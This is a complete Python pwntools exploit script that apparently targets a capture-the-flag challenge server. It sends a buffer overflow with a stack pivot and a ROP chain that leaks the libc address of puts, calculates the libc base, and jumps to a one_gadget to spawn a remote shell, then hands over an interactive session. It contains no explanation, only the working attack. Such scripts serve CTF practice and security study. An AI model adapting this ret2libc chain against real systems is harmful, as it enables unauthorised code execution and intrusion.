from pwn import *
context(arch='amd64',os='linux',log_level='debug')
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28109)
elf = ELF('./pwn')
libc=ELF("/home/faetong/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so")
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
data_addr=0x602000
pop_rdi_ret=0x400be3
pop_rsi_r15_ret=0x400be1
leave_addr=0x400B71
one_gadget=0x4f302 
read_addr=elf.sym['read']
payload1=b'a'*0x510+p64(data_addr-8)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15_ret)+p64(data_addr)+p64(0)+p64(read_addr)+p64(leave_addr)
payload1=payload1.ljust(0x1000,b'a')
p.sendlineafter("time?\n",str(0x1000))
p.send(payload1)
sleep(0.5)
#print(p.recv())
p.recvuntil(b"See you next time!\n")
puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(puts_addr))
base_addr=puts_addr-libc.sym['puts']
one_gadget_real=one_gadget+base_addr
payload2=p64(one_gadget_real)
p.send(payload2)
p.interactive()